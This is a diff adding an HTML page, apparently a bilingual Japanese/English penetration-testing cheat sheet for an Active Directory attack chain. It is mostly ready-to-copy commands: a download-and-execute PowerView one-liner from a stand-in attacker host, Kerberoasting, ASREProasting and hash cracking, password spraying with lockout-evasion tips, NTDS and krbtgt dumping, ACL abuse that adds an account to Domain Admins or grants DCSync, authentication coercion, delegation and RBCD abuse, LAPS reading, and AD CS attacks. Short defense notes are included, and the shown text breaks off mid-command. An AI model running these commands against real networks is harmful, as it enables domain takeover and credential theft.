@@ -1,0 +1,925 @@
+<!doctype html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Active Directory Compromise — d0me</title>
+<meta name="description" content="Full Active Directory attack chain aligned with MITRE ATT&CK tactics from Discovery through Impact, with both Windows and Linux tradecraft.">
+<link rel="icon" href="../assets/img/favicon.svg" type="image/svg+xml">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Zen+Kaku+Gothic+New:wght@400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/sheet.css">
+</head>
+<body>
+
+<header class="topbar">
+  <div class="wrap">
+    <div class="brand"><span class="glyph">[<b data-handle>d0me</b>]</span><span class="tag">索引</span></div>
+    <button class="nav-toggle" aria-label="メニュー">≡</button>
+    <nav class="nav"><a href="../all.html">索引</a><a href="../index.html#certs">資格</a><a href="#" data-gh-url>github</a></nav>
+  </div>
+</header>
+
+<main>
+<section class="sheet-hero">
+  <div class="wrap">
+    <div class="crumb"><a href="/" data-blog>blog</a><span class="sep">/</span><a href="../all.html">索引</a><span class="sep">/</span>Active Directory Compromise</div>
+    <h1>Active Directory Compromise</h1>
+    <p class="lede">Full AD attack chain from initial foothold to forest compromise, structured by MITRE ATT&amp;CK tactics from Discovery through Impact.<span class="jp">初期侵入から DA 取得・Forest 侵害までの完全な攻撃連鎖を、MITRE ATT&amp;CK の Tactic 軸 (Discovery → Impact) で整理。</span></p>
+  </div>
+</section>
+
+<div class="wrap">
+<div class="sheet-layout">
+  <aside class="toc">
+    <div class="toc-label">目次</div>
+    <ul>
+      <li><a href="#s1">01 Discovery</a></li>
+      <li><a href="#s2">02 Credential Access</a></li>
+      <li><a href="#s3">03 Privilege Escalation</a></li>
+      <li><a href="#s4">04 Lateral Movement</a></li>
+      <li><a href="#s5">05 Persistence</a></li>
+      <li><a href="#s6">06 Impact</a></li>
+      <li><a href="#ref">07 References</a></li>
+    </ul>
+  </aside>
+
+  <article class="doc">
+
+    <section id="s1" class="reveal">
+      <h2><span class="num">01</span>Discovery<span class="jp">偵察・列挙</span></h2>
+      <p>ドメイン参加ホスト取得直後から、認証情報なし段階と認証情報あり段階の双方で、ドメイン構造・特権グループ・委任設定・BloodHound 経路を可視化する。ここでの取得情報は後続の全 Tactic の判断材料になる。</p>
+
+      <h3>ドメイン基本情報 (低権限 / 認証不要)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div><pre><code>nltest /dclist:%USERDNSDOMAIN%
+nltest /domain_trusts /all_trusts
+nltest /dsgetdc:%USERDNSDOMAIN%
+echo %LOGONSERVER%</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># RSAT (要インストール)</span>
+Get-ADDomain
+Get-ADForest
+Get-ADDomainController -Filter *
+Get-ADTrust -Filter *
+
+<span class="c"># Domain SID (Golden Ticket 用)</span>
+(Get-ADDomain).DomainSID
+(Get-ADDomain -Identity child.contoso.local).DomainSID</code></pre></div>
+
+      <h3>PowerView 偵察 (RSAT 不要、最汎用)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code>iex(new-object net.webclient).downloadstring('http://<span class="v">&lt;ATTACKER_HOST&gt;</span>/PowerView.ps1')
+
+<span class="c"># 基本情報</span>
+Get-NetDomain; Get-NetForest; Get-NetForestDomain
+Get-NetDomainController; Get-DomainTrust; Get-DomainSID
+
+<span class="c"># ユーザ列挙</span>
+Get-NetUser | Select samaccountname, description, memberof, lastlogon, pwdlastset
+Get-NetUser -AdminCount | Select samaccountname
+Get-NetUser -PreauthNotRequired | Select samaccountname
+Get-NetUser -SPN | Select samaccountname, serviceprincipalname
+Get-DomainUser -AllowDelegation -AdminCount | Select samaccountname
+
+<span class="c"># グループ列挙</span>
+Get-NetGroup | Where { $_.adminCount -eq 1 } | Select samaccountname
+Get-NetGroupMember -GroupName "Domain Admins" -Recurse
+Get-NetGroupMember -GroupName "Enterprise Admins" -Recurse
+Get-NetGroupMember -GroupName "DnsAdmins" -Recurse
+
+<span class="c"># コンピュータ列挙 (委任設定確認)</span>
+Get-NetComputer | Select name, operatingsystem, dnshostname
+Get-NetComputer -Unconstrained | Select name
+Get-DomainComputer -TrustedToAuth | Select name, msds-allowedtodelegateto
+Get-DomainComputer | Where { $_.'msds-allowedtoactonbehalfofotheridentity' } | Select name
+
+<span class="c"># OU / GPO</span>
+Get-NetOU
+Get-NetGPO</code></pre></div>
+
+      <h3>ldapsearch (Linux 側、認証情報あり)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># ベース情報</span>
+ldapsearch -x -h <span class="v">&lt;DC_IP&gt;</span> -s base namingcontexts
+
+<span class="c"># 全ユーザ列挙</span>
+ldapsearch -x -H ldap://<span class="v">&lt;DC_IP&gt;</span> -D "user@contoso.local" -w '<span class="v">&lt;PASSWORD&gt;</span>' \
+  -b "DC=contoso,DC=local" "(objectClass=user)" sAMAccountName
+
+<span class="c"># Kerberoast 候補 (SPN あり)</span>
+ldapsearch -x -H ldap://<span class="v">&lt;DC_IP&gt;</span> -D "user@contoso.local" -w '<span class="v">&lt;PASSWORD&gt;</span>' \
+  -b "DC=contoso,DC=local" "(&amp;(objectClass=user)(servicePrincipalName=*))" \
+  sAMAccountName servicePrincipalName
+
+<span class="c"># ASREProast 候補 (DONT_REQ_PREAUTH)</span>
+ldapsearch -x -H ldap://<span class="v">&lt;DC_IP&gt;</span> -D "user@contoso.local" -w '<span class="v">&lt;PASSWORD&gt;</span>' \
+  -b "DC=contoso,DC=local" \
+  "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName
+
+<span class="c"># LAPS 有効ホスト</span>
+ldapsearch -x -H ldap://<span class="v">&lt;DC_IP&gt;</span> -D "user@contoso.local" -w '<span class="v">&lt;PASSWORD&gt;</span>' \
+  -b "DC=contoso,DC=local" "(ms-Mcs-AdmPwdExpirationTime=*)" dnsHostName</code></pre></div>
+
+      <h3>認証情報なし列挙 (匿名 / null session)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># rpcclient (匿名セッション)</span>
+rpcclient -U "" -N <span class="v">&lt;DC_IP&gt;</span>
+&gt; enumdomusers
+&gt; enumdomgroups
+&gt; querydominfo
+&gt; getdompwinfo    <span class="c"># パスワードポリシー (spray 設計に必須)</span>
+
+<span class="c"># NetExec (旧 CrackMapExec)</span>
+netexec smb <span class="v">&lt;DC_IP&gt;</span> -u '' -p '' --users
+netexec smb <span class="v">&lt;DC_IP&gt;</span> -u '' -p '' --groups
+netexec smb <span class="v">&lt;DC_IP&gt;</span> -u 'guest' -p '' --rid-brute
+
+<span class="c"># Kerbrute (ユーザ名検証、ロックアウトなし)</span>
+kerbrute userenum -d contoso.local --dc <span class="v">&lt;DC_IP&gt;</span> \
+  /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt</code></pre></div>
+
+      <h3>BloodHound データ収集 (検知リスク順)</h3>
+      <p>最低検知は DC LDAP のみ (<code>DCOnly</code>)。Session / LoggedOn は権限取得後に段階的に追加する。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># Windows (SharpHound)</span>
+.\SharpHound.exe --CollectionMethod DCOnly,GPOLocalGroup \
+  -d contoso.local --ldapusername user --ldappassword '<span class="v">&lt;PASSWORD&gt;</span>'
+
+.\SharpHound.exe -c All -d contoso.local --zipfilename bh.zip
+
+<span class="c"># 深追い (LoggedOn = ローカル管理権限必要)</span>
+.\SharpHound.exe -c All,LoggedOn,Session,GPOLocalGroup -d contoso.local</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Linux (bloodhound-python)</span>
+bloodhound-python -u user -p '<span class="v">&lt;PASSWORD&gt;</span>' -d contoso.local \
+  -dc dc01.contoso.local -ns <span class="v">&lt;DC_IP&gt;</span> -c DCOnly --zip
+
+bloodhound-python -u user -p '<span class="v">&lt;PASSWORD&gt;</span>' -d contoso.local \
+  -dc dc01.contoso.local -ns <span class="v">&lt;DC_IP&gt;</span> -c All --zip
+
+<span class="c"># neo4j 起動 + BloodHound GUI</span>
+sudo neo4j start
+bloodhound &amp;    <span class="c"># http://localhost:7474</span></code></pre></div>
+
+      <h3>重要 Cypher クエリ</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cypher</span><button class="copy">copy</button></div><pre><code><span class="c">// 自分から DA への最短経路</span>
+MATCH p=shortestPath((u:User {name:"USER@CONTOSO.LOCAL"})-[*1..]-&gt;(g:Group {name:"DOMAIN ADMINS@CONTOSO.LOCAL"})) RETURN p
+
+<span class="c">// Kerberoastable + 高権限グループメンバー</span>
+MATCH (u:User {hasspn:true})-[:MemberOf*1..]-&gt;(g:Group)
+WHERE g.name CONTAINS "ADMIN" RETURN u.name, g.name
+
+<span class="c">// ASREProastable</span>
+MATCH (u:User {dontreqpreauth:true}) RETURN u.name
+
+<span class="c">// Unconstrained Delegation ホスト</span>
+MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
+
+<span class="c">// RBCD 候補 (Computer への GenericWrite 等)</span>
+MATCH (u)-[:GenericAll|GenericWrite|WriteOwner|WriteDacl]-&gt;(c:Computer)
+RETURN u.name, c.name
+
+<span class="c">// LAPS 読取権限保有者</span>
+MATCH (u)-[:ReadLAPSPassword]-&gt;(c:Computer) RETURN u.name, c.name
+
+<span class="c">// 自分が書込可能なオブジェクト全て</span>
+MATCH (u:User {name:"USER@CONTOSO.LOCAL"})-[r]-&gt;(n)
+WHERE type(r) IN ['GenericAll','GenericWrite','WriteOwner','WriteDacl','AddMember','ForceChangePassword']
+RETURN u.name, type(r), n.name
+
+<span class="c">// アクティブセッション (LoggedOn 収集時)</span>
+MATCH p=(c:Computer)-[:HasSession]-&gt;(u:User {name:"DA_USER@CONTOSO.LOCAL"}) RETURN p</code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>Event ID 4662 (DirectoryServiceAccess) と 5136 (Directory Service Changes) の異常な LDAP 検索を SIEM で集約、大量 SPN query は BloodHound 収集の signature</li>
+          <li>ハニーポットアカウント (SPN 付き / 実利用ゼロ) を配置、Kerberoast 試行検知に活用</li>
+          <li>Sysmon Event 11 (FileCreated) で SharpHound zip / BloodHound json の生成を検知</li>
+          <li>DC の LDAP query rate baseline を確立、閾値超過をアラート</li>
+        </ul>
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>Phase 1 でロックアウトポリシー・パスワードポリシーを必ず確認 (spray 設計に必須)</li>
+          <li>BloodHound は DCOnly から開始し、Session / LoggedOn は権限取得後に段階的に追加</li>
+          <li>認証情報なし段階でも RID brute (<code>--rid-brute</code>) / Kerbrute userenum で有効ユーザ列挙は可能</li>
+          <li>LAPS 有効ホスト・Unconstrained Delegation ホスト・Kerberoast 候補は同一 LDAP セッション内で纏めて取得</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s2" class="reveal">
+      <h2><span class="num">02</span>Credential Access<span class="jp">認証情報取得</span></h2>
+      <p>ドメイン内で有効な認証情報を得るための一次経路。Kerberoast / ASREProast は Discovery で列挙した候補に対して実行、パスワードスプレーはパスワードポリシー確認後に慎重に、NTDS ダンプは DCSync 権限取得後の最終収穫。</p>
+
+      <h3>Kerberoasting (SPN 保有ユーザ)</h3>
+      <p>SPN 登録アカウントの TGS はユーザの鍵で暗号化されるため、TGS を取得しオフラインクラック可能。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Linux (impacket)</span>
+GetUserSPNs.py -dc-ip <span class="v">&lt;DC_IP&gt;</span> -outputfile kerberoast.txt \
+  -request contoso.local/user:'<span class="v">&lt;PASSWORD&gt;</span>'
+
+<span class="c"># 既存 Kerberos チケットで</span>
+GetUserSPNs.py -dc-ip <span class="v">&lt;DC_IP&gt;</span> -k -no-pass -request contoso.local/user</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># Windows (Rubeus)</span>
+.\Rubeus.exe kerberoast /outfile:kerberoast.txt /nowrap
+.\Rubeus.exe kerberoast /user:svc_sql /nowrap
+.\Rubeus.exe kerberoast /rc4opsec /nowrap             <span class="c"># RC4 のみ (クラック容易な対象)</span>
+.\Rubeus.exe kerberoast /tgtdeleg /nowrap             <span class="c"># TGT 委任、最低検知</span>
+.\Rubeus.exe kerberoast /spn:MSSQLSvc/sql01.contoso.local:1433 /nowrap</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># ハッシュクラック</span>
+hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -O
+<span class="c"># AES etype 18: -m 19700, etype 17: -m 19600</span></code></pre></div>
+
+      <h3>ASREProasting (Pre-auth 無効ユーザ)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Linux — 既知ユーザリストで試行</span>
+GetNPUsers.py -dc-ip <span class="v">&lt;DC_IP&gt;</span> -usersfile users.txt -no-pass \
+  -format hashcat -outputfile asreproast.txt contoso.local/
+
+<span class="c"># 認証情報あり (LDAP 経由発見)</span>
+GetNPUsers.py -dc-ip <span class="v">&lt;DC_IP&gt;</span> -request -format hashcat \
+  -outputfile asreproast.txt contoso.local/user:'<span class="v">&lt;PASSWORD&gt;</span>'</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># Windows (Rubeus)</span>
+.\Rubeus.exe asreproast /format:hashcat /outfile:asreproast.txt /nowrap
+.\Rubeus.exe asreproast /user:svc_sql /format:hashcat /nowrap</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>hashcat -m 18200 asreproast.txt /usr/share/wordlists/rockyou.txt -O</code></pre></div>
+
+      <h3>パスワードスプレー</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 事前確認: パスワードポリシー (ロックアウト回避)</span>
+netexec smb <span class="v">&lt;DC_IP&gt;</span> -u user -p '<span class="v">&lt;PASSWORD&gt;</span>' --pass-pol
+rpcclient -U "user%<span class="v">&lt;PASSWORD&gt;</span>" <span class="v">&lt;DC_IP&gt;</span> -c "getdompwinfo"
+
+<span class="c"># Kerbrute (高速、ログ少)</span>
+kerbrute passwordspray -d contoso.local --dc <span class="v">&lt;DC_IP&gt;</span> \
+  users.txt 'Winter2024!'
+
+<span class="c"># NetExec (汎用)</span>
+netexec smb <span class="v">&lt;DC_IP&gt;</span> -u users.txt -p 'Winter2024!' \
+  -d contoso.local --continue-on-success
+netexec smb <span class="v">&lt;DC_IP&gt;</span> -u users.txt -p passwords.txt \
+  -d contoso.local --continue-on-success --no-bruteforce
+
+<span class="c"># 季節 + 西暦パターン (頻出)</span>
+for season in Spring Summer Autumn Winter; do
+  for year in 2023 2024 2025; do
+    netexec smb <span class="v">&lt;DC_IP&gt;</span> -u users.txt -p "${season}${year}!" \
+      -d contoso.local --continue-on-success
+  done
+done</code></pre></div>
+
+      <div class="note"><span class="lbl">Note</span>
+        <ul>
+          <li><code>BadPwdCount</code> のリセット時間 (通常 30 分) を考慮、5 回以下 / 30 分でロックアウト回避</li>
+          <li><code>--continue-on-success</code> で正解を得ても全ユーザ試行を継続</li>
+          <li>検知回避のため jitter (<code>--jitter 60</code>) + 並列度抑制 (<code>-t 1</code>)</li>
+        </ul>
+      </div>
+
+      <h3>NTDS.dit / SAM 取得</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># DC 上で (DCSync 可能な場合は不要)</span>
+secretsdump.py -dc-ip <span class="v">&lt;DC_IP&gt;</span> \
+  contoso.local/Administrator:'<span class="v">&lt;PASSWORD&gt;</span>'@<span class="v">&lt;DC_IP&gt;</span>
+
+<span class="c"># Hash 使用</span>
+secretsdump.py -dc-ip <span class="v">&lt;DC_IP&gt;</span> \
+  -hashes :<span class="v">&lt;NTLM_HASH&gt;</span> \
+  contoso.local/Administrator@<span class="v">&lt;DC_IP&gt;</span>
+
+<span class="c"># 特定ユーザのみ (DCSync 権限あれば)</span>
+secretsdump.py -just-dc-user krbtgt \
+  contoso.local/user:'<span class="v">&lt;PASSWORD&gt;</span>'@<span class="v">&lt;DC_IP&gt;</span>
+
+<span class="c"># ローカル SAM</span>
+secretsdump.py -sam sam.hiv -system system.hiv LOCAL</code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>Fine-Grained Password Policy (PSO) をサービスアカウントに適用、長さ 25 文字以上を強制</li>
+          <li>AES-only Kerberos 暗号化に切替、RC4 サポートを削除 (Kerberoast 実効性を大幅低下)</li>
+          <li>Honeytoken SPN アカウントへの Event 4769 (etype 23 = RC4) を SIEM でアラート</li>
+          <li>アカウントロックアウト閾値 5 attempts / 30 min リセット</li>
+          <li>LSA Protection (<code>RunAsPPL=1</code>) + Credential Guard で LSASS メモリ抽出を阻止</li>
+          <li>特権アカウントを Protected Users グループに配置 (NTLM 拒否、Kerberos AES 強制)</li>
+        </ul>
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>Kerberoast は SPN 保有ユーザで pre-auth 有効でも成立、Event 4769 で etype 23 request が signature</li>
+          <li>ASREProast は <code>DONT_REQ_PREAUTH</code> (UAC 4194304) 属性を持つユーザのみ、AS-REP から直接クラック</li>
+          <li>Password spray は Discovery で lockout policy 取得済み前提、Kerbrute は AS-REQ ベースでログ量少</li>
+          <li>DCSync 権限は非 DA でも保有しうる (delegated principal)、<code>Find-InterestingDomainAcl</code> で事前確認</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s3" class="reveal">
+      <h2><span class="num">03</span>Privilege Escalation<span class="jp">特権昇格</span></h2>
+      <p>Discovery で発見した ACL 経路 / 委任設定 / LAPS 権限 / AD CS 脆弱テンプレートを実際に武器化する層。BloodHound の可視化から具体的な PowerView / Rubeus / impacket / certipy コマンドへの落とし込みが中心。</p>
+
+      <h3>ACL Abuse</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># ForceChangePassword — Windows (PowerView)</span>
+$pw = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
+Set-DomainUserPassword -Identity victim -AccountPassword $pw</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># ForceChangePassword — Linux (bloodyAD)</span>
+bloodyAD -d contoso.local -u attacker -p '<span class="v">&lt;PASSWORD&gt;</span>' --host <span class="v">&lt;DC_IP&gt;</span> \
+  set password victim 'NewPass123!'
+
+<span class="c"># rpcclient</span>
+rpcclient -U "contoso.local/attacker%<span class="v">&lt;PASSWORD&gt;</span>" <span class="v">&lt;DC_IP&gt;</span>
+&gt; setuserinfo2 victim 23 'NewPass123!'</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># GenericWrite (User) → Targeted Kerberoast</span>
+Set-DomainObject -Identity victim -SET @{serviceprincipalname='pwn/spn'}
+.\Rubeus.exe kerberoast /user:victim /nowrap
+<span class="c"># クラック後、SPN 除去</span>
+Set-DomainObject -Identity victim -Clear serviceprincipalname</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Shadow Credentials (msDS-KeyCredentialLink 書込)</span>
+pywhisker -d contoso.local -u attacker -p '<span class="v">&lt;PASSWORD&gt;</span>' \
+  --target victim --action add
+
+<span class="c"># 取得証明書で PKINIT TGT</span>
+python3 gettgtpkinit.py -cert-pfx victim.pfx -pfx-pass <span class="v">&lt;PFX_PASS&gt;</span> \
+  contoso.local/victim victim.ccache
+
+<span class="c"># UnPACtheHash で NTLM 取得</span>
+python3 getnthash.py -key <span class="v">&lt;AS_REP_KEY&gt;</span> contoso.local/victim</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># AddMember (Group)</span>
+Add-DomainGroupMember -Identity 'Domain Admins' -Members 'attacker'</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>bloodyAD -d contoso.local -u attacker -p '<span class="v">&lt;PASSWORD&gt;</span>' --host <span class="v">&lt;DC_IP&gt;</span> \
+  add groupMember 'Domain Admins' attacker
+
+net rpc group addmem "Domain Admins" attacker \
+  -U "contoso\attacker%<span class="v">&lt;PASSWORD&gt;</span>" -S <span class="v">&lt;DC_IP&gt;</span></code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># WriteDACL (Domain Object) → DCSync 権限付与</span>
+Add-DomainObjectAcl -TargetIdentity 'DC=contoso,DC=local' \
+  -PrincipalIdentity attacker \
+  -Rights DCSync</code></pre></div>
+
+      <h3>Unconstrained Delegation</h3>
+      <p>前提: 該当ホストのローカル Admin 取得済 + Spooler / EFSRPC 稼働の別ホストあり。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># 1. Unconstrained ホスト確認</span>
+Get-DomainComputer -Unconstrained | Select name, operatingsystem
+
+<span class="c"># 2. Spooler パイプ確認</span>
+dir \\<span class="v">&lt;TARGET_DC&gt;</span>\pipe\spoolss
+
+<span class="c"># 3. Unconstrained ホスト上で TGT 監視</span>
+.\Rubeus.exe monitor /interval:1 /filteruser:DC01$ /nowrap
+
+<span class="c"># 4. 別シェルで SpoolSample で DC 認証強制</span>
+.\SpoolSample.exe DC01 <span class="v">&lt;UNCONSTRAINED_HOST&gt;</span>
+
+<span class="c"># 5. Rubeus に DC01$ TGT が表示 → PtT</span>
+.\Rubeus.exe ptt /ticket:<span class="v">&lt;BASE64_TGT&gt;</span>
+
+<span class="c"># 6. DCSync</span>
+mimikatz # lsadump::dcsync /domain:contoso.local /user:krbtgt</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># PetitPotam (EFSRPC 経由 coercion)</span>
+python3 PetitPotam.py -u user -p '<span class="v">&lt;PASSWORD&gt;</span>' \
+  <span class="v">&lt;UNCONSTRAINED_HOST&gt;</span> <span class="v">&lt;DC_IP&gt;</span></code></pre></div>
+
+      <h3>Constrained Delegation (S4U2proxy)</h3>
+      <p>前提: 委任設定されたアカウントの NTLM / AES key 取得済。<code>/altservice</code> で SPN 名を拡張可能 (SPN の service class 部分は KDC で検証されない)。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># Windows (Rubeus)</span>
+.\Rubeus.exe s4u \
+  /user:svc_constrained$ \
+  /rc4:<span class="v">&lt;NTLM_HASH&gt;</span> \
+  /impersonateuser:Administrator \
+  /msdsspn:cifs/target.contoso.local \
+  /altservice:cifs,host,http,winrm \
+  /ptt /nowrap
+
+klist
+dir \\target.contoso.local\C$</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Linux (impacket)</span>
+getST.py \
+  -spn cifs/target.contoso.local \
+  -impersonate Administrator \
+  -dc-ip <span class="v">&lt;DC_IP&gt;</span> \
+  'contoso.local/svc_constrained$:<span class="v">&lt;PASSWORD&gt;</span>'
+
+<span class="c"># Hash 使用</span>
+getST.py \
+  -spn cifs/target.contoso.local \
+  -impersonate Administrator \
+  -hashes :<span class="v">&lt;NTLM_HASH&gt;</span> \
+  -dc-ip <span class="v">&lt;DC_IP&gt;</span> \
+  'contoso.local/svc_constrained$'
+
+export KRB5CCNAME=Administrator@cifs_target.contoso.local@CONTOSO.LOCAL.ccache
+impacket-psexec -k -no-pass target.contoso.local</code></pre></div>
+
+      <h3>Resource-Based Constrained Delegation (RBCD)</h3>
+      <p>前提: ターゲット Computer オブジェクトへの <code>GenericWrite</code> / <code>GenericAll</code> / <code>WriteDACL</code> / <code>WriteOwner</code> 権限。<code>ms-DS-MachineAccountQuota</code> がデフォルト (10) のままなら認証ユーザ自身で machine account を作成可能。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># Windows (Rubeus + Powermad)</span>
+
+<span class="c"># 1. 偽マシンアカウント作成</span>
+Import-Module .\Powermad.ps1
+$pw = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+New-MachineAccount -MachineAccount attacker -Password $pw -Verbose
+
+<span class="c"># 2. ターゲットの msDS-AllowedToActOnBehalfOfOtherIdentity に attacker$ 設定</span>
+Import-Module .\Microsoft.ActiveDirectory.Management.dll
+Set-ADComputer TARGET -PrincipalsAllowedToDelegateToAccount attacker$ -Verbose
+
+<span class="c"># 3. attacker$ の RC4 hash 計算</span>
+.\Rubeus.exe hash /password:Password123! /user:attacker /domain:contoso.local
+<span class="c"># → rc4_hmac: &lt;RC4_HASH&gt;</span>
+
+<span class="c"># 4. S4U で Administrator チケット取得</span>
+.\Rubeus.exe s4u \
+  /user:attacker$ \
+  /rc4:<span class="v">&lt;RC4_HASH&gt;</span> \
+  /impersonateuser:Administrator \
+  /msdsspn:cifs/target.contoso.local \
+  /altservice:cifs,host,http,winrm,ldap \
+  /ptt /nowrap
+
+<span class="c"># 5. TARGET にアクセス</span>
+dir \\target.contoso.local\C$</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Linux (impacket)</span>
+
+<span class="c"># 1. 偽マシンアカウント作成</span>
+addcomputer.py -computer-name 'attacker$' \
+  -computer-pass 'Password123!' \
+  -dc-ip <span class="v">&lt;DC_IP&gt;</span> \
+  contoso.local/user:'<span class="v">&lt;PASSWORD&gt;</span>'
+
+<span class="c"># 2. RBCD 属性書込</span>
+rbcd.py -delegate-to 'TARGET$' -delegate-from 'attacker$' -action write \
+  -dc-ip <span class="v">&lt;DC_IP&gt;</span> \
+  contoso.local/user:'<span class="v">&lt;PASSWORD&gt;</span>'
+
+<span class="c"># 3. S4U でチケット取得</span>
+getST.py -spn cifs/target.contoso.local -impersonate Administrator \
+  -dc-ip <span class="v">&lt;DC_IP&gt;</span> \
+  'contoso.local/attacker$:Password123!'
+
+<span class="c"># 4. PtT</span>
+export KRB5CCNAME=Administrator@cifs_target.contoso.local@CONTOSO.LOCAL.ccache
+impacket-psexec -k -no-pass target.contoso.local</code></pre></div>
+
+      <h3>LAPS パスワード読取</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># PowerView</span>
+Get-DomainComputer | Where { $_."ms-mcs-admpwd" } | \
+  Select dnshostname, ms-mcs-admpwd
+Get-DomainComputer -Identity TARGET -Properties ms-Mcs-AdmPwd
+
+<span class="c"># SharpLAPS</span>
+.\SharpLAPS.exe /user:contoso\reader /pass:'<span class="v">&lt;PASSWORD&gt;</span>' /host:<span class="v">&lt;DC_IP&gt;</span>
+
+<span class="c"># RSAT</span>
+Get-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd' | \
+  Where { $_.'ms-Mcs-AdmPwd' } | Select Name, 'ms-Mcs-AdmPwd'</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># NetExec (LAPSv1)</span>
+netexec ldap <span class="v">&lt;DC_IP&gt;</span> -u reader -p '<span class="v">&lt;PASSWORD&gt;</span>' -M laps
+
+<span class="c"># ldapsearch</span>
+ldapsearch -x -h <span class="v">&lt;DC_IP&gt;</span> -D "reader@contoso.local" -w '<span class="v">&lt;PASSWORD&gt;</span>' \
+  -b "DC=contoso,DC=local" \
+  "(&amp;(objectClass=computer)(ms-MCS-AdmPwd=*))" \
+  ms-MCS-AdmPwd dnsHostName</code></pre></div>
+
+      <h3>AD CS (Certified Pre-Owned)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 脆弱テンプレート列挙 — Linux (certipy)</span>
+certipy find -u user -p '<span class="v">&lt;PASSWORD&gt;</span>' -dc-ip <span class="v">&lt;DC_IP&gt;</span> -vulnerable -enabled</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># Windows (Certify)</span>
+.\Certify.exe find /vulnerable
+.\Certify.exe find /vulnerable /currentuser</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># ESC1 — SAN 指定可能テンプレート</span>
+certipy req -u attacker@contoso.local -p '<span class="v">&lt;PASSWORD&gt;</span>' \
+  -ca <span class="v">&lt;CA_NAME&gt;</span> -target ca.contoso.local \
+  -template VulnTemplate \
